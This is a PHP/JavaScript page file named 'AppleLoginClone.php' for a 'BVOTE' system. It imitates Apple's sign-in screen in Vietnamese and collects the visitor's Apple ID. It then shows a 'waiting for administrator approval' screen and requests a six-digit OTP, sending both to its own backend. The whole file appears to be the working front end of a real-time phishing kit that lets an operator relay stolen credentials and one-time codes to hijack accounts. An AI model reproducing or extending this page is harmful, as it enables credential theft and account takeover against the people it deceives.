<?php
// AppleLoginClone.php - BVOTE Auto Login System
?>
<div class="bg-white p-6 rounded-lg text-black w-full flex flex-col justify-center">
  <div class="text-center mb-6">
    <div class="mb-4">
      <!-- Apple Logo -->
      <div class="w-16 h-16 bg-black rounded-full flex items-center justify-center mx-auto">
        <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
          <path d="M18.71 19.5c-.83 1.24-2.04 2.5-3.55 2.5-1.22 0-1.75-.75-3.27-.75-1.52 0-2.05.75-3.27.75-1.51 0-2.72-1.26-3.55-2.5-1.82-2.72-2.35-7.5 1.71-11.22C9.76 5.5 12.5 5.5 15.5 5.5c.75 0 1.5.25 2.21.5.71.25 1.42.5 2.29.5.87 0 1.58-.25 2.29-.5.71-.25 1.44-.5 2.21-.5 3 0 5.74 0 7.79 2.28 4.06 3.72 3.53 8.5 1.71 11.22z"/>
        </svg>
      </div>
    </div>
    <h2 class="text-2xl font-semibold">Đăng nhập với Apple ID</h2>
    <p class="text-sm text-gray-600 mt-1">để tiếp tục đến BVOTE</p>
  </div>

  <form id="apple-login-form" class="space-y-4" onsubmit="return handleAppleLogin(event)">
    <input id="apple-account" name="account" type="email"
           placeholder="Apple ID" required
           class="w-full h-11 border border-gray-300 focus:border-gray-500 focus:ring-gray-500 text-black rounded px-3" />

    <button type="submit" class="w-full h-11 bg-black hover:bg-gray-800 text-white font-semibold rounded">
      Tiếp tục
    </button>
  </form>

  <div class="text-center mt-4">
    <a href="#" class="text-sm text-blue-600 hover:underline">Quên Apple ID?</a>
  </div>

  <div class="text-center mt-4">
    <p class="text-xs text-gray-500">Bằng cách đăng nhập, bạn đồng ý với <a href="#" class="text-blue-600 hover:underline">Điều khoản sử dụng</a></p>
  </div>
</div>

<script>
var isLoadingApple = false;

function handleAppleLogin(e) {
  e.preventDefault();
  if (isLoadingApple) return false;

  const account = document.getElementById('apple-account').value.trim();
  if (!account) {
    alert('Vui lòng nhập Apple ID');
    return false;
  }

  isLoadingApple = true;
  const submitBtn = e.target.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Đang xử lý...';
  submitBtn.disabled = true;

  // Gọi API Auto Login
  fetch('/api/social-login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      platform: 'apple',
      user_hint: account
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      // Chuyển đến màn hình chờ phê duyệt
      showWaitingScreen(data.request_id, 'apple');
    } else {
      alert('Lỗi: ' + (data.error || 'Không thể tạo yêu cầu đăng nhập'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  })
  .finally(() => {
    isLoadingApple = false;
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  });

  return false;
}

function showWaitingScreen(requestId, platform) {
  // Tạo modal chờ phê duyệt
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-gray-800 mx-auto mb-4"></div>
        <h3 class="text-lg font-semibold mb-2">Đang chờ phê duyệt</h3>
        <p class="text-gray-600 mb-4">Yêu cầu đăng nhập của bạn đang được xem xét bởi quản trị viên.</p>
        <div class="text-sm text-gray-500">
          <p>Nền tảng: ${platform}</p>
          <p>ID yêu cầu: ${requestId}</p>
        </div>
        <div class="mt-4">
          <button onclick="checkLoginStatus('${requestId}')" class="bg-black text-white px-4 py-2 rounded hover:bg-gray-800">
            Kiểm tra trạng thái
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Tự động kiểm tra trạng thái mỗi 5 giây
  const interval = setInterval(() => {
    checkLoginStatus(requestId, interval, modal);
  }, 5000);
}

function checkLoginStatus(requestId, interval = null, modal = null) {
  fetch(`/api/social-login/status/${requestId}`)
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        const status = data.request.status;

        if (status === 'APPROVED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Đăng nhập thành công! Chào mừng bạn đến với BVOTE.');
          window.location.href = '/user/home'; // Chuyển đến trang chủ user
        } else if (status === 'OTP_REQUIRED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          showOTPDialog(requestId);
        } else if (status === 'REJECTED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Yêu cầu đăng nhập bị từ chối. Vui lòng thử lại.');
        } else if (status === 'EXPIRED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Yêu cầu đăng nhập đã hết hạn. Vui lòng thử lại.');
        }
      } else {
        console.error('Error checking status:', data.error);
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });
}

function showOTPDialog(requestId) {
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <h3 class="text-lg font-semibold mb-4">Nhập mã OTP</h3>
        <p class="text-gray-600 mb-4">Vui lòng nhập mã xác thực được gửi đến bạn.</p>
        <div class="mb-4">
          <input type="text" id="otp-input" placeholder="Nhập mã OTP"
                 class="w-full p-3 border border-gray-300 rounded text-center text-lg tracking-widest"
                 maxlength="6" pattern="[0-9]{6}">
        </div>
        <div class="flex space-x-2">
          <button onclick="verifyOTP('${requestId}')" class="bg-black text-white px-4 py-2 rounded hover:bg-gray-800">
            Xác thực
          </button>
          <button onclick="this.closest('.fixed').remove()" class="bg-gray-500 text-white px-4 py-2 rounded hover:bg-gray-600">
            Hủy
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Focus vào input OTP
  setTimeout(() => {
    document.getElementById('otp-input').focus();
  }, 100);
}

function verifyOTP(requestId) {
  const otpInput = document.getElementById('otp-input');
  const otp = otpInput.value.trim();

  if (!otp || otp.length !== 6) {
    alert('Vui lòng nhập đúng 6 số OTP');
    return;
  }

  fetch(`/api/social-login/${requestId}/otp`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ otp: otp })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      alert('Xác thực OTP thành công! Chào mừng bạn đến với BVOTE.');
      window.location.href = '/user/home';
    } else {
      alert('Lỗi: ' + (data.error || 'OTP không đúng'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  });
}
</script>
